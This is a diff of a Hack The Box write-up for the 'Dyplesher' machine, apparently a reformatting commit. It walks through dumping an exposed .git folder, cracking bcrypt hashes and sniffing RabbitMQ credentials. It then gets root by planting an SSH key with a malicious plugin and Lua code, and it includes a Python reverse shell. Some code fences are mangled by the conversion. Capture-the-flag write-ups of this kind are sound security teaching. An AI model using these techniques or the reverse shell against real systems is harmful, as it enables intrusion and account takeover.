@@ -2,7 +2,7 @@
 
 ## Overview
 
-![](<machine>.infocard.png)
+![](https://github.com/zweilosec/htb-writeups/tree/dda4572d292886fc4ce08354b2cca9e61a905df3/linux-machines/insane/machine%3E.infocard.png)
 
 Short description to include any strange things to be dealt with
 
@@ -10,11 +10,11 @@ Short description to include any strange things to be dealt with
 
 #### Useful thing 1
 
-- description with generic example
+* description with generic example
 
 #### Useful thing 2
 
-- description with generic example
+* description with generic example
 
 ## Enumeration
 
@@ -22,7 +22,7 @@ Short description to include any strange things to be dealt with
 
 I started my enumeration with an nmap scan of `10.10.10.190`. The options I regularly use are: `-p-`, which is a shortcut which tells nmap to scan all ports, `-sC` is the equivalent to `--script=default` and runs a collection of nmap enumeration scripts against the target, `-sV` does a service scan, and `-oA <name>` saves the output with a filename of `<name>`.
 
-```
+```text
 ┌──(zweilos㉿kali)-[~/htb/dyplesher]
 └─$ nmap -n -v -sCV -p- 10.10.10.190 -oA dyplesher
 Starting Nmap 7.80 ( https://nmap.org ) at 2020-10-05 20:41 EDT
@@ -239,21 +239,21 @@ two entry boxes for key and value
 
 found a link to staff, led to a page with 3 users, link under each user `http://dyplesher.htb:8080/arrexel` added to hosts file
 
-in the source code of the page found an `app.js`, at the end found a path `C:\Users\felamos\Documents\tekkro\resources\js\app.js`  looks like a Windows machine?
+in the source code of the page found an `app.js`, at the end found a path `C:\Users\felamos\Documents\tekkro\resources\js\app.js` looks like a Windows machine?
 
-searching for `tekkro` leads to https://tekkitserverlist.com/server/0fOnRygu/tekkro-tekkit-classic - refers to modpack for Minecraft called `Tekkit Classic`
+searching for `tekkro` leads to [https://tekkitserverlist.com/server/0fOnRygu/tekkro-tekkit-classic](https://tekkitserverlist.com/server/0fOnRygu/tekkro-tekkit-classic) - refers to modpack for Minecraft called `Tekkit Classic`
 
-https://tekkitclassic.fandom.com/wiki/The_Tekkit_Wiki
+[https://tekkitclassic.fandom.com/wiki/The\_Tekkit\_Wiki](https://tekkitclassic.fandom.com/wiki/The_Tekkit_Wiki)
 
 > Created by the Technic team, Tekkit Classic is a modpack for the record breaking sandbox construction game Minecraft. It brings together some of the best mods from the Minecraft community for automating, industrializing and powering your worlds and bundles them into one easy download!
-
+>
 > Tekkit Classic runs on a base of Minecraft 1.2.5 and has Bukkit inbuilt, so the full range of Bukkit Pluggins are available for server owners.
 
 Possible minecraft version? 1.2.5
 
-While scanning with dirbuster, found a `.git` folder, browsing to gets denied, but tried using `git-dumper.py` like in `Travel`(make link to my writeup) machine
+While scanning with dirbuster, found a `.git` folder, browsing to gets denied, but tried using `git-dumper.py` like in `Travel`\(make link to my writeup\) machine
 
-```
+```text
 ┌──(zweilos㉿kali)-[~/htb/dyplesher]
 └─$ ~/.local/bin/git-dumper/git-dumper.py http://test.dyplesher.htb/.git/ gitdump                   1 ⨯
 [-] Testing http://test.dyplesher.htb/.git/HEAD [200]
@@ -304,10 +304,10 @@ While scanning with dirbuster, found a `.git` folder, browsing to gets denied, b
 [-] Fetching http://test.dyplesher.htb/.git/objects/27/29b565f353181a03b2e2edb030a0e2b33d9af0 [200]
 [-] Fetching http://test.dyplesher.htb/.git/objects/3f/91e452f3cbfa322a3fbd516c5643a6ebffc433 [200]
 [-] Running git checkout .
-                                                                                                        
+
 ┌──(zweilos㉿kali)-[~/htb/dyplesher]
 └─$ cd gitdump        
-                                                                                                        
+
 ┌──(zweilos㉿kali)-[~/htb/dyplesher/gitdump]
 └─$ ls -la         
 total 16
@@ -317,12 +317,12 @@ drwxr-xr-x 7 zweilos zweilos 4096 Oct 10 16:08 .git
 -rw-r--r-- 1 zweilos zweilos  513 Oct 10 16:08 index.php
 -rw-r--r-- 1 zweilos zweilos    0 Oct 10 16:08 README.md
 ```
+
 Was able to dump the contents of the git repository
 
+in the index.php there are credentials and access information for a memcached server - found [https://techleader.pro/a/90-Accessing-Memcached-from-the-command-line](https://techleader.pro/a/90-Accessing-Memcached-from-the-command-line) for accessing through the command line -
 
-in the index.php there are credentials and access information for a memcached server - found https://techleader.pro/a/90-Accessing-Memcached-from-the-command-line for accessing through the command line - 
-
-```
+```text
 ┌──(zweilos㉿kali)-[~/htb/dyplesher]
 └─$ telnet 10.10.10.190 11211
 Trying 10.10.10.190...
@@ -336,9 +336,9 @@ Connection closed by foreign host.
 
 unfortunately telnet did not work
 
-https://github.com/jorisroovers/memclient
+[https://github.com/jorisroovers/memclient](https://github.com/jorisroovers/memclient)
 
-```
+```text
 Usage: memclient [OPTIONS] COMMAND [arg...]
 
 Simple command-line client for Memcached
@@ -361,11 +361,11 @@ Commands:
 Run 'memclient COMMAND --help' for more information on a command.
 ```
 
-https://github.com/RedisLabs/bmemcached-cli
+[https://github.com/RedisLabs/bmemcached-cli](https://github.com/RedisLabs/bmemcached-cli)
 
 Unfortunately this tool was written in python2 so I had to go through and fix it up so it ran in python3...after fixing it it ran just fine and connected me to the memcached server
 
-```
+```text
 ┌──(zweilos㉿kali)-[~/htb/dyplesher/bmemcached-cli]
 └─$ bmemcached-cli felamos:zxcvbnm@dyplesher.htb:11211                        
 Connecting to felamos:zxcvbnm@dyplesher.htb:11211
@@ -382,9 +382,9 @@ Undocumented commands:
 EOF  delete_multi  exit
 ```
 
-https://amriunix.com/post/memcached-enumeration/
+[https://amriunix.com/post/memcached-enumeration/](https://amriunix.com/post/memcached-enumeration/)
 
-```
+```text
 ([B]memcached) stats slabs
 {'dyplesher.htb:11211': {'1:cas_badval': b'0',
                          '1:cas_hits': b'0',
@@ -450,9 +450,7 @@ https://amriunix.com/post/memcached-enumeration/
                          'total_malloced': b'4194304'}}
 ```
 
-
-
-```
+```text
 ([B]memcached) get username
 'MinatoTW\nfelamos\nyuntao\n'
 ([B]memcached) get password
@@ -462,13 +460,13 @@ https://amriunix.com/post/memcached-enumeration/
 ([B]memcached)
 ```
 
-```
+```text
 ┌──(zweilos㉿kali)-[~/htb/dyplesher]
 └─$ hashcat --help | grep -i bcrypt                                                           
 3200 | bcrypt $2*$, Blowfish (Unix)                     | Operating System
 ```
 
-```
+```text
 ┌──(zweilos㉿kali)-[~/htb/dyplesher]
 └─$ hashcat -O -D1,2 -a0 -m3200 hashes /usr/share/wordlists/rockyou.txt                              
 hashcat (v6.1.1) starting...
@@ -509,9 +507,9 @@ Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:320-352
 Candidates.#1....: joselyn -> joselito
 ```
 
-one of the password hashes was cracked fairly quickly, however only two of the hashes were recognized by hashcat (one seemed to be the wrong length) `mommy1`
+one of the password hashes was cracked fairly quickly, however only two of the hashes were recognized by hashcat \(one seemed to be the wrong length\) `mommy1`
 
-nmap reports that port 3000 is running `Gog` and "<meta name="description" content="Gogs is a painless self-hosted Git service" />" Searching for Gogs and git leads to https://gogs.io/
+nmap reports that port 3000 is running `Gog` and "" Searching for Gogs and git leads to [https://gogs.io/](https://gogs.io/)
 
 I tried logging into SSH with this password and the four usernames I have found but no luck, so I tried seeing what was at this Gog site
 
@@ -519,53 +517,54 @@ I created an account to see what would happen - take pics
 
 felamos:mommy1 logged in
 
-found git repository where the memcached pages were we got earlier from gitdumpl also found backup of gitlab - found releases page with V1 release, downloaded repo.zip, contained .bundle file - https://gist.github.com/paulgregg/181779ad186221aaa35d5a96c8abdea7 for instructions to recreate repository
+found git repository where the memcached pages were we got earlier from gitdumpl also found backup of gitlab - found releases page with V1 release, downloaded repo.zip, contained .bundle file - [https://gist.github.com/paulgregg/181779ad186221aaa35d5a96c8abdea7](https://gist.github.com/paulgregg/181779ad186221aaa35d5a96c8abdea7) for instructions to recreate repository
 
-```
+```text
 ┌──(zweilos㉿kali)-[~/…/repositories/@hashed/4b/22]
 └─$ git clone --mirror 4b227777d4dd1fc61c6f884f48641d02b4d121d3fd328cb08b5531fcacdabf8a.bundle ./repo/.git
 Cloning into bare repository './repo/.git'...
 Receiving objects: 100% (39/39), 10.46 KiB | 10.46 MiB/s, done.
 Resolving deltas: 100% (12/12), done.
-         
+
 ┌──(zweilos㉿kali)-[~/…/repositories/@hashed/4b/22]
 └─$ cd repo 
-         
+
 ┌──(zweilos㉿kali)-[~/…/@hashed/4b/22/repo]
 └─$ git init
 Reinitialized existing Git repository in /home/zweilos/htb/dyplesher/repositories/@hashed/4b/22/repo/.git/
-         
+
 ┌──(zweilos㉿kali)-[~/…/@hashed/4b/22/repo]
 └─$ git checkout
-         
+
 ┌──(zweilos㉿kali)-[~/…/@hashed/4b/22/repo]
 └─$ git status  
 On branch master
 nothing to commit, working tree clean
-         
+
 ┌──(zweilos㉿kali)-[~/…/@hashed/4b/22/repo]
 └─$ ls
 LICENSE  README.md  src
 ```
+
 votelistener.py repo
 
-```
+```text
 ┌──(zweilos㉿kali)-[~/…/repositories/@hashed/4e/07]
 └─$ git clone --mirror 4e07408562bedb8b60ce05c1decfe3ad16b72230967de01f640b7e4729b49fce.bundle repo/.git
 Cloning into bare repository 'repo/.git'...
 Receiving objects: 100% (51/51), 20.94 MiB | 98.79 MiB/s, done.
 Resolving deltas: 100% (5/5), done.
-                                                                                                        
+
 ┌──(zweilos㉿kali)-[~/…/repositories/@hashed/4e/07]
 └─$ cd repo
-                                                                                                        
+
 ┌──(zweilos㉿kali)-[~/…/@hashed/4e/07/repo]
 └─$ git init
 Reinitialized existing Git repository in /home/zweilos/htb/dyplesher/repositories/@hashed/4e/07/repo/.git/
-                                                                                                        
+
 ┌──(zweilos㉿kali)-[~/…/@hashed/4e/07/repo]
 └─$ git checkout
-                                                                                                        
+
 ┌──(zweilos㉿kali)-[~/…/@hashed/4e/07/repo]
 └─$ git status                           
 On branch master
@@ -598,13 +597,14 @@ drwxr-xr-x 2 zweilos zweilos     4096 Oct 10 20:21 python
 drwxr-xr-x 5 zweilos zweilos     4096 Oct 10 20:21 world
 drwxr-xr-x 3 zweilos zweilos     4096 Oct 10 20:21 world_the_end
 ```
-craftbukkit.jar repo - https://getbukkit.org/ mincrafft hosting code
+
+craftbukkit.jar repo - [https://getbukkit.org/](https://getbukkit.org/) mincrafft hosting code
 
 > GetBukkit The most reliable and secure Minecraft server mirror.
-
+>
 > Get Bukkit strives to be available 24 hours a day and 7 days a week for server owners, hosts, and the general public, providing the safest and most trusted third-party Minecraft server mirror.
 
-```
+```text
 database:
   username: bukkit
   isolation: SERIALIZABLE
@@ -612,25 +612,25 @@ database:
   password: walrus
   url: jdbc:sqlite:{DIR}{NAME}.db
 ```
+
 potential database info
 
-```
+```text
 ┌──(zweilos㉿kali)-[~/…/4e/07/repo/plugins]
 └─$ ls
 LoginSecurity  LoginSecurity.jar  PluginMetrics
-         
+
 ┌──(zweilos㉿kali)-[~/…/4e/07/repo/plugins]
 └─$ cd LoginSecurity 
-          
+
 ┌──(zweilos㉿kali)-[~/…/07/repo/plugins/LoginSecurity]
 └─$ ls
 authList  config.yml  users.db
 ```
 
-
 in the plugins folder there was a LoginSecurity.jar and related files; config.yml had
 
-```
+```text
 MySQL:
   use: false
   host: localhost
@@ -641,9 +641,9 @@ MySQL:
   prefix: ''
 ```
 
-users.db (with pictures)
+users.db \(with pictures\)
 
-```
+```text
 ┌──(zweilos㉿kali)-[~/htb/dyplesher]
 └─$ hashcat -O -D1,2 -a0 -m3200 hashes /usr/share/wordlists/rockyou.txt
 hashcat (v6.1.1) starting...
@@ -674,20 +674,19 @@ $2a$10$IRgHi7pBhb9K0QBQBOzOju0PyOZhBnK4yaWjeZYdeP6oyDvCo9vc6:alexis1
 
 another password found: `alexis1` - LoginSecurity plugin
 
-Tried, SSH - no, found login page on main site (http://dyplesher.htb) with dirbuster, used burp intruder to check the login page - felamos@dyplesher.htb and alexis1 to log in
+Tried, SSH - no, found login page on main site \([http://dyplesher.htb](http://dyplesher.htb)\) with dirbuster, used burp intruder to check the login page - felamos@dyplesher.htb and alexis1 to log in
 
-in the dashboard found a page with a potential list of more usernames, also found a plugin upload page.  did research on creating malicious minecraft plugins
+in the dashboard found a page with a potential list of more usernames, also found a plugin upload page. did research on creating malicious minecraft plugins
 
-https://www.spigotmc.org/resources/spigot-anti-malware-detects-over-200-malicious-plugins.64982/ - addon for detecting malicious plugins - saw mention of this in the source somewhere...so may need to do encoding/obfuscation?
+[https://www.spigotmc.org/resources/spigot-anti-malware-detects-over-200-malicious-plugins.64982/](https://www.spigotmc.org/resources/spigot-anti-malware-detects-over-200-malicious-plugins.64982/) - addon for detecting malicious plugins - saw mention of this in the source somewhere...so may need to do encoding/obfuscation?
 
-https://www.instructables.com/Creating-a-Minecraft-Plugin/ - found instructions on making a minecraft plugin
+[https://www.instructables.com/Creating-a-Minecraft-Plugin/](https://www.instructables.com/Creating-a-Minecraft-Plugin/) - found instructions on making a minecraft plugin
 
 > Creating a Minecraft Plugin
 
-```Important Info
+\`\`\`Important Info
 
 1. You need to be proficient in Java
-
 2. You need to know about general programming concepts
 
 Steps
@@ -701,8 +700,8 @@ Steps
 · Learn some bukkit basics.
 
 · Learn some bukkit advanced topics.
-```
 
+```text
 https://stackoverflow.com/questions/22359193/bukkit-getting-a-response-from-a-php-file
 https://stackoverflow.com/questions/3984185/how-to-write-a-java-desktop-app-that-can-interact-with-my-websites-api
 
@@ -713,22 +712,14 @@ how to write to files in Java: https://www.w3schools.com/java/java_files_create.
 
 code example from
 https://github.com/Bukkit/SamplePlugin
-
 ```
-┌──(zweilos㉿kali)-[~/htb/dyplesher]
-└─$ ssh-keygen -t ecdsa 
-Generating public/private ecdsa key pair.
-Enter file in which to save the key (/home/zweilos/.ssh/id_ecdsa): minato.key
-Enter passphrase (empty for no passphrase): 
-Enter same passphrase again: 
-Your identification has been saved in minato.key
-Your public key has been saved in minato.key.pub
-                                                                             
-┌──(zweilos㉿kali)-[~/htb/dyplesher]
-└─$ cat minato.key.pub                
+
+┌──\(zweilos㉿kali\)-\[~/htb/dyplesher\] └─$ ssh-keygen -t ecdsa Generating public/private ecdsa key pair. Enter file in which to save the key \(/home/zweilos/.ssh/id\_ecdsa\): minato.key Enter passphrase \(empty for no passphrase\): Enter same passphrase again: Your identification has been saved in minato.key Your public key has been saved in minato.key.pub
+
+┌──\(zweilos㉿kali\)-\[~/htb/dyplesher\] └─$ cat minato.key.pub  
 ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBNcXZSv1c0okURSUinJWRCJyRJH64w1sBdoYgGDSC1IC/yoEEyTtVV7DgbjuAumrFXWifccQOywvSBG+MDWwlzw= zweilos@kali
-```
 
+```text
 I created a new ssh key 
 
 ```java
@@ -761,12 +752,12 @@ public class Plugin extends JavaPlugin {
     }
 }
 ```
-I used the java plugin to write my key to the authorized_keys file in ``/home/MinatoTW/.ssh` and logged in.
+
+I used the java plugin to write my key to the authorized\_keys file in ```/home/MinatoTW/.ssh`` and logged in.
 
 ## Initial Foothold
 
-
-```
+```text
 ┌──(zweilos㉿kali)-[~/htb/dyplesher]
 └─$ ssh -i minato.key MinatoTW@dyplesher.htb 
 The authenticity of host 'dyplesher.htb (10.10.10.190)' can't be established.
@@ -801,12 +792,11 @@ uid=1001(MinatoTW) gid=1001(MinatoTW) groups=1001(MinatoTW),122(wireshark)
 dyplesher
 ```
 
-Immediately I noticed that this user was in the Wireshark group, which sounded interesting.  Since I didnt have a gui I decided to try running tshark to see if there was interesting traffic on the host  
-
+Immediately I noticed that this user was in the Wireshark group, which sounded interesting. Since I didnt have a gui I decided to try running tshark to see if there was interesting traffic on the host
 
 I wrote the captured packets to a pcapng file and exfiltrated it to my computer after capturing for a few minutes
 
-```
+```text
 MinatoTW@dyplesher:~$ ls -la
 total 100
 drwxr-xr-x 10 MinatoTW MinatoTW  4096 Oct 11 20:20 .
@@ -828,9 +818,10 @@ drwxrwxr-x  6 MinatoTW MinatoTW  4096 Apr 23 09:58 paper
 drwx------  2 MinatoTW MinatoTW  4096 May 20 13:45 .ssh
 -rw-------  1 MinatoTW MinatoTW   802 Apr 23 15:18 .viminfo
 ```
+
 enumerating a bit more as MinatoTW
 
-```
+```text
 MinatoTW@dyplesher:~$ cd Cuberite/
 MinatoTW@dyplesher:~/Cuberite$ ls -la
 total 10144
@@ -878,19 +869,20 @@ Wireshark pictures
 
 found list of users and passwords
 
-```
+```text
 AMQPLAIN...,.LOGINS....yuntao.PASSWORDS...
 EashAnicOc3Op
 ```
-There was a login username and password for AMQPLAIN, which turned out to be the AAA controls for RabbitMQ (Which I saw open on port 5672 earlier in my nmap output) - https://www.rabbitmq.com/access-control.html
 
-```
+There was a login username and password for AMQPLAIN, which turned out to be the AAA controls for RabbitMQ \(Which I saw open on port 5672 earlier in my nmap output\) - [https://www.rabbitmq.com/access-control.html](https://www.rabbitmq.com/access-control.html)
+
+```text
 Only root or rabbitmq should run rabbitmqctl
 ```
 
 I tried adding a user but got an error. I guess I need to find a user in the rabbitmq group?
 
-```
+```text
 {"name":"Golda Rosenbaum","email":"randi.friesen@yahoo.com","address":"313 Scot Meadows Suite 035\nNorth Leann, ID 97610-9866","password":"ev6GwyaHTl5D","subscribed":true}
 {"name":"Prof. Ross Grant","email":"lelia.gorczany@yahoo.com","address":"6857 Wehner Key Apt. 134\nNorth Federicobury, OR 86559","password":"ev6GwyaHTl5D","subscribed":true}
 {"name":"Kristian Medhurst","email":"stanley22@treutel.com","address":"85098 Devin Locks Apt. 507\nMissouriside, ME 05589","password":"ev6GwyaHTl5D","subscribed":true}
@@ -905,13 +897,13 @@ I tried adding a user but got an error. I guess I need to find a user in the rab
 
 The first set of users all had the same password
 
-```
+```text
 {"name":"MinatoTW","email":"MinatoTW@dyplesher.htb","address":"India","password":"bihys1amFov","subscribed":true}
 {"name":"yuntao","email":"yuntao@dyplesher.htb","address":"Italy","password":"wagthAw4ob","subscribed":true
 {"name":"felamos","email":"felamos@dyplesher.htb","address":"India","password":"tieb0graQueg","subscribed":true}
 ```
-However the next three names seemed familiar
 
+However the next three names seemed familiar
 
 ## Road to User
 
@@ -919,14 +911,13 @@ However the next three names seemed familiar
 
 ### Finding user creds
 
-
 ### User.txt
 
 ## Path to Power \(Gaining Administrator Access\)
 
 ### Enumeration as User `felamos`
 
-```
+```text
 MinatoTW@dyplesher:~$ cd backup/
 MinatoTW@dyplesher:~/backup$ ls
 backup.sh  email  password  username
@@ -980,9 +971,10 @@ drwxrwxr-x  4 MinatoTW MinatoTW     4096 May 20 13:43 plugins
 -rw-rw-r--  1 MinatoTW MinatoTW        2 Sep  8  2019 whitelist.json
 drwxrwxr-x  5 MinatoTW MinatoTW     4096 Oct 12 13:21 world
 ```
+
 In the backup folder I found the script and files that had given me information earlier through memcached
 
-```
+```text
 MinatoTW@dyplesher:~/Cuberite/Plugins/DumpInfo$ sudo -l
 [sudo] password for MinatoTW: 
 Sorry, user MinatoTW may not run sudo on dyplesher.
@@ -1015,18 +1007,18 @@ Sorry, user felamos may not run sudo on dyplesher.
 elamos@dyplesher:~$ cat user.txt 
 a8ffa4d970e7a74c9039b7afd39c9dc8
 ```
+
 I found the user.txt by `su`ing to `felamos`, but unfortunately no rabbit group and no sudo
 
-```
+```text
 #!/bin/bash
-  
+
 echo 'Hey yuntao, Please publish all cuberite plugins created by players on plugin_data "Exchange" and "Queue". Just send url to download plugins and our new code will review it and working plugins will be added to the server.' >  /dev/pts/{}
-
 ```
 
-in the yuntao folder there was a note `send.sh` regarding user created plugins and using the `plugin_data` Exchange and Queue.  It also says to send the url of new plugins and the server wil automatically add them.  This looks like a good privilege escalation route if I can figure out how to send 
+in the yuntao folder there was a note `send.sh` regarding user created plugins and using the `plugin_data` Exchange and Queue. It also says to send the url of new plugins and the server wil automatically add them. This looks like a good privilege escalation route if I can figure out how to send
 
-```
+```text
 felamos@dyplesher:~/yuntao$ cat /etc/passwd
 root:x:0:0:root:/root:/bin/bash
 daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
@@ -1068,9 +1060,10 @@ git:x:113:119:Git Version Control,,,:/home/git:/bin/bash
 epmd:x:114:120::/var/run/epmd:/usr/sbin/nologin
 rabbitmq:x:115:121:RabbitMQ messaging server,,,:/var/lib/rabbitmq:/usr/sbin/nologin
 ```
+
 after checking `/etc/passwd` I noticed something a bit strange...is `git` usually able to login with a shell?
 
-```
+```text
 felamos@dyplesher:/home$ su yuntao
 Password: 
 yuntao@dyplesher:/home$ cd ~
@@ -1088,11 +1081,12 @@ yuntao@dyplesher:~$ sudo -l
 [sudo] password for yuntao: 
 Sorry, user yuntao may not run sudo on dyplesher.
 ```
+
 Well not I had three users that I could freely `su` between, but I was still missing something
 
-searching for privilege escalation and rabbitMQ led to https://book.hacktricks.xyz/pentesting/15672-pentesting-rabbitmq-management
+searching for privilege escalation and rabbitMQ led to [https://book.hacktricks.xyz/pentesting/15672-pentesting-rabbitmq-management](https://book.hacktricks.xyz/pentesting/15672-pentesting-rabbitmq-management)
 
-found a way to interact with rabbitMQ through python at https://www.rabbitmq.com/tutorials/tutorial-one-python.html
+found a way to interact with rabbitMQ through python at [https://www.rabbitmq.com/tutorials/tutorial-one-python.html](https://www.rabbitmq.com/tutorials/tutorial-one-python.html)
 
 ```python
 #!/usr/bin/env python3
@@ -1114,15 +1108,13 @@ print(" [x] 'Hello World!'")
 connection.close()
 ```
 
-I created a test script to see if I could send messages through rabbit...unfortunately there was no pika module installed.  I installed the pika module on my machine and looked up how to connect remotely
+I created a test script to see if I could send messages through rabbit...unfortunately there was no pika module installed. I installed the pika module on my machine and looked up how to connect remotely
 
-https://github.com/pika/pika
-https://pika.readthedocs.io/en/stable/
-https://stackoverflow.com/questions/27805086/how-to-connect-pika-to-rabbitmq-remote-server-python-pika
+[https://github.com/pika/pika](https://github.com/pika/pika) [https://pika.readthedocs.io/en/stable/](https://pika.readthedocs.io/en/stable/) [https://stackoverflow.com/questions/27805086/how-to-connect-pika-to-rabbitmq-remote-server-python-pika](https://stackoverflow.com/questions/27805086/how-to-connect-pika-to-rabbitmq-remote-server-python-pika)
 
-https://www.spigotmc.org/threads/rabbitmq-plugin.74032/
+[https://www.spigotmc.org/threads/rabbitmq-plugin.74032/](https://www.spigotmc.org/threads/rabbitmq-plugin.74032/)
 
-```
+```text
 ┌──(zweilos㉿kali)-[~/htb/dyplesher]
 └─$ python3 ./rabbit-pika.py
 Traceback (most recent call last):
@@ -1135,11 +1127,11 @@ Traceback (most recent call last):
 pika.exceptions.ChannelClosedByBroker: (406, "PRECONDITION_FAILED - inequivalent arg 'durable' for queue 'plugin_data' in vhost '/': received 'false' but current is 'true'")
 ```
 
-using the message I had found in the `yuntao` folder in `felamos` home folder I set the Queue and routing_key to be `plugin_data`, however it seems like setting the Queue caused an error.  
+using the message I had found in the `yuntao` folder in `felamos` home folder I set the Queue and routing\_key to be `plugin_data`, however it seems like setting the Queue caused an error.
 
 ```python
 #!/usr/bin/env python3
-  
+
 import pika
 
 credentials = pika.PlainCredentials('yuntao', 'EashAnicOc3Op')
@@ -1162,12 +1154,12 @@ print(" [x] 'Hello World!'")
 
 connection.close()
 ```
-I ran a python http server on the local machine since the note in the `yuntao` folder had mentioned entering a url for plugins. Next I ran the script again and was able to see it connect to my server on the dyplesher machine.  
 
+I ran a python http server on the local machine since the note in the `yuntao` folder had mentioned entering a url for plugins. Next I ran the script again and was able to see it connect to my server on the dyplesher machine.
 
 ```python
 #!/usr/bin/env python3
-  
+
 import socket,subprocess,os,pty
 
 s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
@@ -1182,20 +1174,20 @@ os.dup2(s.fileno(),2)
 
 pty.spawn("/bin/bash")
 ```
+
 I wrote a python reverse shell back to my machine
 
-```
+```text
 MinatoTW@dyplesher:/dev/shm$ python3 -m http.server 8090
 Serving HTTP on 0.0.0.0 port 8090 (http://0.0.0.0:8090/) ...
 127.0.0.1 - - [12/Oct/2020 14:09:47] "GET /rtme.py HTTP/1.0" 200 -
 ^C
 Keyboard interrupt received, exiting.
-
 ```
 
-My script worked, and connected to the http server and got my file, but the python reverse shell didnt work...and neither did writing to `root`'s authorized_keys file after modifying the local script.  I decided to do some more enumeration of the files in MinatoTW's folder to see if there was anything that I missed that could give me any clues as how to proceed
+My script worked, and connected to the http server and got my file, but the python reverse shell didnt work...and neither did writing to `root`'s authorized\_keys file after modifying the local script. I decided to do some more enumeration of the files in MinatoTW's folder to see if there was anything that I missed that could give me any clues as how to proceed
 
-```
+```text
 MinatoTW@dyplesher:~/Cuberite$ ls -la
 total 10144
 drwxrwxr-x 11 MinatoTW MinatoTW    4096 Apr 23 15:14 .
@@ -1273,30 +1265,32 @@ drwxr-xr-x 3 MinatoTW MinatoTW 4096 Oct 12 14:30 ..
 -rw-r--r-- 1 MinatoTW MinatoTW  183 Sep  7  2019 tcat.png
 -rw-r--r-- 1 MinatoTW MinatoTW  132 Sep  7  2019 thead.png
 ```
-In the Cuberrite folder I found some files related to the Minecraft server called Cuberite.  In the `webadmin` folder I found some files related to generating keys and a script that would generate self-signed keys for the server.  The `template.lua` file included code for loading plugins and running code for the webadmin site
+
+In the Cuberrite folder I found some files related to the Minecraft server called Cuberite. In the `webadmin` folder I found some files related to generating keys and a script that would generate self-signed keys for the server. The `template.lua` file included code for loading plugins and running code for the webadmin site
+
+```text
 
 ```
-```
 
-doing a search for lua cRoot led me to pages related to Cuberite - https://api.cuberite.org/cRoot.html
+doing a search for lua cRoot led me to pages related to Cuberite - [https://api.cuberite.org/cRoot.html](https://api.cuberite.org/cRoot.html)
 
->cRoot class
-
->This class represents the root of Cuberite's object hierarchy. There is always only one cRoot object. It manages and allows querying all the other objects, such as cServer, cPluginManager, individual worlds etc.
+> cRoot class
+>
+> This class represents the root of Cuberite's object hierarchy. There is always only one cRoot object. It manages and allows querying all the other objects, such as cServer, cPluginManager, individual worlds etc.
 
 If this server will execute lua scripts as code then perhaps I could use one to either send me a shell or write an SSH key
 
-https://www.tutorialspoint.com/lua/lua_file_io.htm
+[https://www.tutorialspoint.com/lua/lua\_file\_io.htm](https://www.tutorialspoint.com/lua/lua_file_io.htm)
 
 ```lua
 file = io.open("/home/MinatoTW/.ssh/authorized_keys", "a+")
-  
+
 file.write("ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBNcXZSv1c0okURSUinJWRCJyRJH64w1sBdoYgGDSC1IC/yoEEyTtVV7DgbjuAumrFXWifccQOywvSBG+MDWwlzw= zweilos@kali")
 
 file.close()
-
 ```
-I tested my lua script by running it and appending my SSH key (again) to MinatoTW's file, and was successful
+
+I tested my lua script by running it and appending my SSH key \(again\) to MinatoTW's file, and was successful
 
 ### Getting a shell
 
@@ -1304,16 +1298,17 @@ Next I tried running the script against root through my remote RabbitMQ connecti
 
 ```lua
 file = io.open("/root/.ssh/authorized_keys", "w")
-  
+
 file.write("ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBNcXZSv1c0okURSUinJWRCJyRJH64w1sBdoYgGDSC1IC/yoEEyTtVV7DgbjuAumrFXWifccQOywvSBG+MDWwlzw= zweilos@kali")
 
 file.close()
 ```
-after some troubleshooting...I realized that for some reason the file was not being opened for appending.  Changing the 'mode' to write made everything work~
+
+after some troubleshooting...I realized that for some reason the file was not being opened for appending. Changing the 'mode' to write made everything work~
 
 ### Root.txt
 
-```
+```text
 ┌──(zweilos㉿kali)-[~/htb/dyplesher]
 └─$ ssh -i minato.key root@dyplesher.htb                                                          130 ⨯
 Welcome to Ubuntu 19.10 (GNU/Linux 5.3.0-46-generic x86_64)
@@ -1345,6 +1340,7 @@ root@dyplesher:~# cat root.txt
 a0a4e509a610c426f8eb668a977774f0
 ```
 
-Thanks to [`felamos`](https://www.hackthebox.eu/home/users/profile/27390) & [yuntao](https://www.hackthebox.eu/home/users/profile/12438) for creating this very challenging, yet very fun and interesting machine!  I learned a lot more about Minecraft plugins than I ever thought I would want to!
+Thanks to [`felamos`](https://www.hackthebox.eu/home/users/profile/27390) & [yuntao](https://www.hackthebox.eu/home/users/profile/12438) for creating this very challenging, yet very fun and interesting machine! I learned a lot more about Minecraft plugins than I ever thought I would want to!
 
 If you like this content and would like to see more, please consider supporting me through Patreon at [https://www.patreon.com/zweilosec](https://www.patreon.com/zweilosec).
+
